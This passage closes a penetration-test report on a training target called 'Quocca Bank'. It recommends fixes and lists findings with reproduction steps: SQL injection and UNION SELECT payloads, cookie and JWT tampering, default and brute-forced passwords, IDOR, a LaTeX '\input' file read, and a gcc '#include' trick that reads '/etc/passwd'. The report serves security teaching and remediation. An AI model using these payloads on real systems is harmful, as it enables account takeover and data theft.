To that end, we heavily recommend that "Quocca Bank" fixes the issues described to its best ability in the shortest time-frame possible. For a quick, easy-to-view list of issues, please see [Appendix III](#Appendix-III).

### Vulnerabilities

Quoccabank was vulnerable to cookie-based attacks, SQL injection, unsanitised code, insecure authentication (due to default passwords, lenient password requirements, informative error messages and more), XML EXternal Entity attacks, LaTeX injection, Insecure Direct Object Reference, and more. These were just the vulnerabilities we were able to identify and verify.
We suspect there are other Remote Code Execution-based vulnerabilities in [gcc](gcc.quoccabank.com), [v4 feedifier](v4.feedifier.quoccabank.com), and [signin](signin.quoccabank.com) but we failed to achieve our goal in pen-testing every subdomain due to our lack of knowledge.

### Remediations

Due to the variety of vulnerabilities, providing a summary of remediations is not conducive to actually solving the problem due to the time it would take. Many of the vulnerabilities can be easily solved by disabling certain features. Others, with a quick search-and-replace. We highly recommend seeking:
- [OWASP's Cheat Sheet: https://cheatsheetseries.owasp.org/](https://cheatsheetseries.owasp.org/),
- [Port Swigger's Web Security Academy: https://portswigger.net/web-security](https://portswigger.net/web-security),
- [Mozilla's Web Security Guidelines: https://infosec.mozilla.org/guidelines/web_security](https://infosec.mozilla.org/guidelines/web_security),

to read since they provide quick, easy to understand solutions to all the common problems known. In fact, we have also referred to the above websites in search of industry-standard solutions.

Additionally, one can reference the [National Vulnerability Database](https://nvd.nist.gov/) in order to crosscheck existing systems and tools with found exploits and vulnerabilities in the field.

In order to ensure the implementation of strong systems in the future, we highly recommend following a reputable standards and specification for designing framework. An excellent example would be the **Australian Government's Information Security Manual** which can be [found and downloaded here](https://www.cyber.gov.au/acsc/view-all-content/ism)

## Final Conclusions

We were pleased to be approached by Quocca Bank in their quest to improve their service's security and we remain adamant that it was the right choice to make. While we are confident that we did not manage to find every vulnerability and sadly cannot provide remediations for the ones we could not find, we believe it shows that there are always better security options - considering that a team new to the industry like us could discover this many vulnerabilities. 
Security is a cat-and-mouse chase to patch holes [ideally] before malicious actors find and/or exploit them. As humans are fallible creatures, we believe that while vulnerabilities remain online, Quocca Bank will be far more secure if they adopt the practices we recommend.

# Appendix I

This section exists as we could not find a vulnerability but suspect there is a weakness present. It is currently a work-in-progress and our next report should encompass it.

## Remote Code Execution
### Proof of Concept
#### gcc.quoccabank.com
- Through a little bit of reconnaissance, we can determine that our target is https://gcc.quoccabank.com/flag.php since it is the only address that does not return a 404 and instead returns a blank screen.
- Then, we tried giving gcc a non-C file to compile. This returns text that says the file is "not c file!". But, if resend the request with something like: `https://gcc.quoccabank.com/upload.php?a=/` - i.e. No file, we see that it prints an error message.
![Notice: Undefined index: fileToUpload in /quocca-gcc/upload.php on line 5](https://i.imgur.com/20pUzOA.png)
*The error message*
- Seeing that the "gcc" subdomain is in the `quocca-gcc` directory and `upload.php`, `download.php` and `flag.php` can be accessed by appending it to the https://gcc.quoccabank.com/ url, we can assume that `flag.php` is in the same directory.
- Craft a simple C file [since it actually checks whether the file is valid C or not before compiling and therefore, letting you download the binary]. Something like:
```C
#include "../../path/to/sensitive/text/file"
#include "../../quocca-gcc/flag.php"

int main(void) {
    printf("Hello World\n");
    return 0;
}
```
will do.
- Proceed to try different include paths until target is found. Our target happened to be located at `../../quocca-gcc/flag.php` (or `../../../../etc/passwd` if you preferred) after checking network traffic and downloaded html/js files and if not for gcc complaining about `<?php etc` not being valid C, the flag was close to being acquired.
- Proceed to download compiled binary and open in hex editor or similar tool to find embedded text from the text file.

### Remediation
#### gcc.quoccabank.com
- If this service is a necessity, ensure that each user is containerised or in a sandbox. Ideally, give each user its own, individual system.
- Furthermore, remove read permissions for the user running gcc from sensitive files and directories and execute permissions for the sensitive directories. 
- Even better, an allow-list of directories one can include from.

## Further notes
- `/download.php?binary=flag.php` and variants do not work. Changing `binary` to `flag` or `text` or any other variant tested didn't work.


# Appendix II

P.S. Please fix your "Report Abuse" "link" on the [home page](https://www.quoccabank.com). The "link" only throws up a message telling the clicker to "go away" - an attitude that is non-conducive towards attracting talented, well-meaning security professionals to your team and having them work for the benefit of Quocca Bank. Please implement actual functionality that makes a white-hat hacker/pen-tester actually want to do their work happily for Quocca Bank.

# Appendix III

| Priority | URL                                                     | Vulnerability                                  | Steps to Reproduce                                                                                                                                                                                                                                                                         | Impact                                                                                                                                |
| -------- | ------------------------------------------------------- | ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------- |
| P3       | [blog.quoccabank.com](http://blog.quoccabank.com/)      | IDOR                                           | Note page numbers are sequential, check from 0 onwards. "Hidden" post found at `?p=2`                                                                                                                                                                                                        | Posts that aren't easily accessible aren't completely private from outsiders                                                          |
| P1       | [blog.quoccabank.com](http://blog.quoccabank.com/)      | authentication                                 | After accessing as admin or mq or even understanding how/where WP searches are, a search for "flag" or checking the notification yields this flag.                                                                                                                                         | Important information meant for the privileged user doesn't and can't discriminate between whoever is on the other side of the screen |
| P1       | [blog.quoccabank.com](http://blog.quoccabank.com/)      | authentication                                 | Either through post or understanding of Wordpress, access `/wp-admin` and authenticate using default `username:password` `admin:admin`.                                                                                                                                                          | Access granted to unknown user named `admin`. Not actually an "admin" as we find out later.                                           |
| P4       | [blog.quoccabank.com](http://blog.quoccabank.com/)      | Unsanitised Information                        | In the header of the HTML file of the landing page, a meta tag with the flag can be found. This demonstrates a lack of sanitisation.                                                                                                                                                       | Unintentionally published information can be risky to any business/brand/individual                                                   |
| P1       | [blog.quoccabank.com](http://blog.quoccabank.com/)      | authentication                                 | Sarah and Timmy are the same. After getting clued into the existence of a two-letter user through recon, it was only a matter of brute forcing that due to the login page exposing information about the existence of accounts and using a dictionary attack to get the password `1q2w3e`. | This is the true admin account which means anything and everything can be done from it.                                               |
| P1       | [blog.quoccabank.com](http://blog.quoccabank.com/)      | authentication                                 | Sarah and Timmy are the same. After getting clued into the existence of a two-letter user through recon, it was only a matter of brute forcing that due to the login page exposing information about the existence of accounts and using a dictionary attack to get the password `1q2w3e`. | This is the true admin account which means anything and everything can be done from it.                                               |
| P1       | [sales.quoccabank.com](http://sales.quoccabank.com)     | cookie                                         | The cookie stored is just `admin=0` encoded in base64. Changing it to `admin=1` in base64 grants access immediately.                                                                                                                                                                       | Sensitive financial information is exposed.                                                                                           |
| P3       | [files.quoccabank.com](http://files.quoccabank.com)     | IDOR - `/document/flag?r=YWRtaW4=`               | URL encodes username. Use base64 to change it                                                                                                                                                                                                                                              | Admin privileges granted                                                                                                              |
| P4       | [files.quoccabank.com](http://files.quoccabank.com)     | Unsanitised `/staff_super_secret_file?r=YWE=` | Check javascript. Contains URL to secret directory with sensitive files.                                                                                                                                                                                                                   | Sensitive files exposed.                                                                                                              |
| P3       | [files.quoccabank.com](http://files.quoccabank.com)     | IDOR                                           | Create file after registering account. Change base64 encoded URL suffix into admin encoded in base64                                                                                                                                                                                       |                                                                                                                                       |
| P1       | [files.quoccabank.com](http://files.quoccabank.com)     | Poor user login credentials                    | Check "robots.txt" to uncover existence of `/admin`. Bruteforce passcode `1024`                                                                                                                                                                                                            | Full admin privileges granted                                                                                                         |
| P1       | [notes.quoccabank.com](http://notes.quoccabank.com/)    | Cookie                                         | Edit JWT username to `admin@quoccabank.com` and swapping out cookie                                                                                                                                                                                                                          | gives direct access to admin privileges                                                                                               |
| P3       | [support.quoccabank.com](http://support.quoccabank.com) | IDOR                                           | URL is base64 encoded string of `user:ticket_#`. So brute force or work a bit smarter for `9447:1` and `1125:4` encoded in base64                                                                                                                                                             | Access to other account's tickets                                                                                                     |
| P4       | [support.quoccabank.com](http://support.quoccabank.com) | IDOR                                           | URL is base64 encoded string of `user:ticket_#`. So brute force or work a bit smarter for `9447:1` and `1125:4` encoded in base64                                                                                                                                                     | Access to other account's tickets                                                                                                     |
| P1       | [bigapp.quoccabank.com](http://bigapp.quoccabank.com/)  | cookie                                         | cookie encodes `email:user_type` and simply changing the `user_type` from user to admin grants the user higher privileges.                                                                                                                                                                   | admin privileges granted                                                                                                              |
| P1       | [bigapp.quoccabank.com](http://bigapp.quoccabank.com/)  | SQLi                                           | Logging in using `a 'OR '1'='1' #A` logs you into Sally Rae's account                                                                                                                                                                                                                      | Log into someone else's account. Namely Sally's                                                                                       |
| P1       | [bigapp.quoccabank.com](http://bigapp.quoccabank.com/)  | SQLi                                           | View user table's contents using `a' )) UNION SELECT id, fname,lname,password,type,email FROM users; -- a`, grab md5-hashed passwords and match to already exposed passwords                                                                                                               | User passwords are all exposed                                                                                                        |
| P1       | [bigapp.quoccabank.com](http://bigapp.quoccabank.com/)  | SQLi                                           | Sorting table using a command like this `a')) union select \* from bproducts order by pname -- a` will let us see a different portion of the database that may have been cutoff due to traffic limits.                                                                                     | May let us see a different portion of the database that may have been cutoff due to traffic limits.                                   |
| P1       | [bigapp.quoccabank.com](http://bigapp.quoccabank.com/)  | SQLi                                           | Table injection through: `a')) UNION SELECT table\_name, column\_name, 1, 1, 1, 1 FROM information\_schema.columns -- a`                                                                                                                                                                   | Table injection achieved.                                                                                                             |
| P3       | [bfd.quoccabank.com](http://bfd.quoccabank.com/)        | IDOR                                           | Access url `/etc/passwd`                                                                                                                                                                                                                                                                 | Access to file which has `/etc/passwd`                                                                                                  |
| P1       | [v1.feedifier.quoccabank.com](http://v1.feedifier.com/) | XXE                                            | Craft malicious payload. See [vulnerability report above](#v1.feedifier.quoccabank.com) for more details.                                                                                                                                                                                                                  | Table displays sensitive information                                                                                                  |
| P1       | [v2.feedifier.quoccabank.com](http://v1.feedifier.com/) | XXE                                            | Craft malicious payload. See [vulnerability report above](#v2.feedifier.quoccabank.com) for more details.                                                                                                                                                                                                                  | Table displays sensitive information                                                                                                  |
| P1       | [v3.feedifier.quoccabank.com](http://v1.feedifier.com/) | XXE                                            | Craft malicious payload. See [vulnerability report above](#v3.feedifier.quoccabank.com) for more details.                                                                                                                                                                                                                  | Table displays sensitive information                                                                                                  |
| P1       | [letters.quoccabank.com](http://letters.quoccabank.com) | LaTeX Command Injection                        | Craft letter using this payload `\input{../../flag}`                                                                                                                                                                                                                                    | Gets information stored in flag and prints to letter.                                                                                  |
| P1       | [letters.quoccabank.com](http://letters.quoccabank.com) | LaTeX Command Injection                        | Craft malicious payload. See [vulnerability report above](#LaTeX-Command-Injection) for more details.                                                                                                                                                                                                                  | Enables Remote Code Execution and prints to letter.                                                                                    |
| P1       | [gcc.quoccabank.com](http://gcc.quoccabank.com/)        | GCC                                            | See [Appendix I](#Appendix-I)                                                                                                                                                                                                                                                                              | Gets information stored in flag and embeds in ELF binary.                                                                              |

